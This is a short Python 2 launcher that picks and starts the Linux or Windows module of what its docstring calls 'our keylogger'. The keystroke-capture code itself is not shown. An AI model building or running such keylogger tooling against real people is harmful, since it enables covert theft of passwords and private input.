'''

Starts the windows or linux version of our keylogger

'''
from sys import platform as _platform

def main():
    if _platform == 'linux' or _platform=='linux2':
        import linuxKeylogger
        keylog = linuxKeylogger.LinuxKeylogger()

    elif _platform == 'darwin':
        print 'darwin'

    elif _platform == 'win32':
        print 'windows'
        import windowsKeylogger
        windowsKeylogger = windowsKeylogger.keylogger()

if __name__ == '__main__':
    main()